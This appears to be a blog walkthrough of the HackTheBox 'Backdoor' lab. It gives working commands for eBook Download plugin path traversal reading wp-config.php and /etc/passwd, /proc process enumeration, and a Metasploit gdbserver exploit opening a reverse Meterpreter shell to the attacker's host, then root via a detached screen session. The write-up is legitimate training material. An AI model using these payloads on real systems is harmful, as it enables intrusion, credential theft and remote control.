---
title: "Walk-through of Backdoor from HackTheBox"
header:
  teaser: /assets/images/2021-12-12-21-39-04.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - Gobuster
  - gdbserver
  - Meterpreter
---

## Machine Information

![backdoor](/assets/images/2021-12-12-21-39-04.png)

Backdoor is an easy machine on HackTheBox. We start by finding a basic WordPress site with a vulnerable plugin. This allows directory traversal and local file inclusion, which we use to leak data and spy on processes. From this we find a vulnerable version of gdbserver which we exploit using Meterpreter to get a reverse shell. From there we find a detached screen session that we connect to and gain root.

<!--more-->

Skills required are web and OS enumeration. Skills learned are finding and exploiting vulnerable software.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - Backdoor](https://www.hackthebox.com/home/machines/profile/416) |
| Machine Release Date | 20th November 2021 |
| Date I Completed It | 10th December 2021 |
| Distribution Used | Kali 2021.3 – [Release Info](https://www.kali.org/blog/kali-linux-2021-3-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/backdoor]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.125 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 

┌──(root💀kali)-[~/htb/backdoor]
└─# nmap -p$ports -sC -sV -oA backdoor 10.10.11.125
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-08 21:59 GMT
Nmap scan report for backdoor.htb (10.10.11.125)
Host is up (0.065s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.8.1
|_http-title: Backdoor &#8211; Real-Life
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.96 seconds
```

Three ports found initially. 1337 looks interesting as that's a little unusual, however let's start with Apache on port 80. First add the server IP to my hosts file:

```sh
┌──(root💀kali)-[~/htb/backdoor]
└─# echo "10.10.11.125 backdoor.htb" >> /etc/hosts
```

## WordPress

We find a basic WordPress site:

![backdoor-website](/assets/images/2021-12-08-22-04-04.png)

There's no content here, let's look for subfolders:

```sh
┌──(root💀kali)-[~/htb/backdoor]
└─# gobuster dir -u http://backdoor.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt           
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://backdoor.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/08 22:13:41 Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 317] [--> http://backdoor.htb/wp-content/]
/wp-admin             (Status: 301) [Size: 315] [--> http://backdoor.htb/wp-admin/]  
/wp-includes          (Status: 301) [Size: 318] [--> http://backdoor.htb/wp-includes/]
/server-status        (Status: 403) [Size: 277]
===============================================================
2021/12/08 22:15:21 Finished
===============================================================
```

From those subfolders the interesting one is wp-content, let's check that one out:

```sh
┌──(root💀kali)-[~/htb/backdoor]
└─# gobuster dir -u http://backdoor.htb/wp-content -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://backdoor.htb/wp-content
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/08 22:16:12 Starting gobuster in directory enumeration mode
===============================================================
/plugins              (Status: 301) [Size: 325] [--> http://backdoor.htb/wp-content/plugins/]
/themes               (Status: 301) [Size: 324] [--> http://backdoor.htb/wp-content/themes/] 
/uploads              (Status: 301) [Size: 325] [--> http://backdoor.htb/wp-content/uploads/]
/upgrade              (Status: 301) [Size: 325] [--> http://backdoor.htb/wp-content/upgrade/]
===============================================================
2021/12/08 22:17:50 Finished
===============================================================
```

Looking in plugins we find this:

![backdoor-downloads](/assets/images/2021-12-08-22-17-32.png)

## Searchsploit

Searchsploit gives us something useful:

```sh
┌──(root💀kali)-[~/htb/backdoor]
└─# searchsploit ebook download
-------------------------------------------------------------- ---------------------------------
 Exploit Title                                                |  Path
-------------------------------------------------------------- ---------------------------------
WordPress Plugin eBook Download 1.1 - Directory Traversal     | php/webapps/39575.txt
-------------------------------------------------------------- ---------------------------------
```

Let's check it out:

```sh
┌──(root💀kali)-[~/htb/backdoor]
└─# searchsploit -m php/webapps/39575.txt
  Exploit: WordPress Plugin eBook Download 1.1 - Directory Traversal
      URL: https://www.exploit-db.com/exploits/39575
     Path: /usr/share/exploitdb/exploits/php/webapps/39575.txt
File Type: ASCII text

Copied to: /root/39575.txt

┌──(root💀kali)-[~/htb/backdoor]
└─# cat 39575.txt 
# Exploit Title: Wordpress eBook Download 1.1 | Directory Traversal
# Exploit Author: Wadeek
# Website Author: https://github.com/Wad-Deek
# Software Link: https://downloads.wordpress.org/plugin/ebook-download.zip
# Version: 1.1
# Tested on: Xampp on Windows7

[Version Disclosure]
======================================
http://localhost/wordpress/wp-content/plugins/ebook-download/readme.txt
======================================

[PoC]
======================================
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
======================================
```

## Exploiting Plugin

So we have simple directory traversal and local file inclusion (LFI) vulnerabilities. Let's try the example given above:

```php
┌──(root💀kali)-[~/htb/backdoor]
└─# curl http://backdoor.htb//wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
<SNIP>
```

That works, let's grab passwd:

```sh
┌──(root💀kali)-[~/htb/backdoor]
└─# curl http://backdoor.htb//wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
<SNIP>
user:x:1000:1000:user:/home/user:/bin/bash
```

## Spying On Processes

That also works and we see just root and user as accounts we might be interested in.

In the earlier nmap scan we saw port 1337 was open. With the ability to read arbitrary files we can check out /proc and see what processes are running on the box. [This](https://man7.org/linux/man-pages/man5/proc.5.html) explains more on how the /proc pseudo-filesystem works.

I used a simple loop to incrementally check /proc:

```sh
┌──(root💀kali)-[~/htb/backdoor]
└─# for i in {800..900}; do curl -s http://backdoor.htb//wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/$i/cmdline --output - | tr '\000' ' '| sed 's/<script>window.close()<\/script>/\n/g';  done
/proc/800/cmdline/proc/800/cmdline/proc/800/cmdline
/proc/801/cmdline/proc/801/cmdline/proc/801/cmdline
/proc/802/cmdline/proc/802/cmdline/proc/802/cmdline
/proc/803/cmdline/proc/803/cmdline/proc/803/cmdline
/proc/804/cmdline/proc/804/cmdline/proc/804/cmdline
/proc/805/cmdline/proc/805/cmdline/proc/805/cmdline
/proc/806/cmdline/proc/806/cmdline/proc/806/cmdline
/proc/807/cmdline/proc/807/cmdline/proc/807/cmdline
/proc/808/cmdline/proc/808/cmdline/proc/808/cmdline
/proc/809/cmdline/proc/809/cmdline/proc/809/cmdline
/proc/810/cmdline/proc/810/cmdline/proc/810/cmdline
/proc/811/cmdline/proc/811/cmdline/proc/811/cmdline
/proc/812/cmdline/proc/812/cmdline/proc/812/cmdline/usr/sbin/atd -f 
/proc/813/cmdline/proc/813/cmdline/proc/813/cmdline
/proc/814/cmdline/proc/814/cmdline/proc/814/cmdline/bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done 
/proc/815/cmdline/proc/815/cmdline/proc/815/cmdline/bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done 
/proc/816/cmdline/proc/816/cmdline/proc/816/cmdline
/proc/817/cmdline/proc/817/cmdline/proc/817/cmdline
/proc/818/cmdline/proc/818/cmdline/proc/818/cmdline
<SNIP>
```

We find two interesting things. Port 1337 is running gdbserver, which is our path to getting a foothold. We can also see screen is running with a detached session, we'll come back to that later.

## Meterpreter

A quick search for gdb exploits found [this](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/gdb/gdb_server_exec) article for a metasploit method. Let's try that:

```sh
┌──(root💀kali)-[~/htb/backdoor]
└─# msfconsole -nqx "use exploit/multi/gdb/gdb_server_exec; set payload linux/x64/meterpreter/reverse_tcp; set lhost 10.10.14.241; set rhosts 10.10.11.125; set rport 1337; set target 1; exploit"
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
lhost => 10.10.14.241
rhosts => 10.10.11.125
rport => 1337
target => 1
[*] Started reverse TCP handler on 10.10.14.241:4444 
[*] 10.10.11.125:1337 - Performing handshake with gdbserver...
[*] 10.10.11.125:1337 - Stepping program to find PC...
[*] 10.10.11.125:1337 - Writing payload at 00007ffff7fd0103...
[*] 10.10.11.125:1337 - Executing the payload...
[*] Sending stage (3012548 bytes) to 10.10.11.125
[*] Meterpreter session 1 opened (10.10.14.241:4444 -> 10.10.11.125:33368 ) at 2021-12-09 23:08:17 +0000
meterpreter >
```

We have a session connected, now start a shell:

```text
meterpreter > shell
Process 2402 created.
Channel 1 created.
python3 -c "import pty;pty.spawn('/bin/bash')"
user@Backdoor:~$
```

## User Flag

With our shell stabilised let's grab the user flag:

```text
user@Backdoor:~$ id
id
uid=1000(user) gid=1000(user) groups=1000(user)

user@Backdoor:~$ ls -l
-rw-r----- 1 root user 33 Dec  9 23:17 user.txt

user@Backdoor:~$ cat user.txt
<HIDDEN>
```

## Privilege Escalation

The path to root is simple, but only if you paid attention earlier. When we scanned the processes running on the box remotely we saw this:

```text
/proc/814/cmdline/proc/814/cmdline/proc/814/cmdline/bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done 
```

This shows us that screen is running with a session detached called root. So it's pretty safe to assume we just need to attach to that screen to get our root shell.

[This](https://linux.die.net/man/1/screen) explains what screen is and the parameters it uses, these are the ones we can see are in use:

```text
-d -m Start screen in "detached" mode. This creates a new session but doesn't attach to it. This is useful for system startup scripts.
-S sessionname
```

So this is nice and simple:

```text
user@Backdoor:~$ /usr/bin/screen -x root/root
/usr/bin/screen -x root/root
Please set a terminal type.
```

Set terminal and then try again:

```text
user@Backdoor:~$ export TERM=xterm
export TERM=xterm
user@Backdoor:~$ /usr/bin/screen -x root/root
/usr/bin/screen -x root/root
root@Backdoor:~#
```

## Root Flag

And there we are, let's grab that root flag:

```sh
root@Backdoor:~# id
uid=0(root) gid=0(root) groups=0(root)

root@Backdoor:~# ls -l
-rw-r--r-- 1 root root 33 Dec  9 23:17 root.txt

root@Backdoor:~# cat root.txt
<HIDDEN>
```

All done. See you next time.
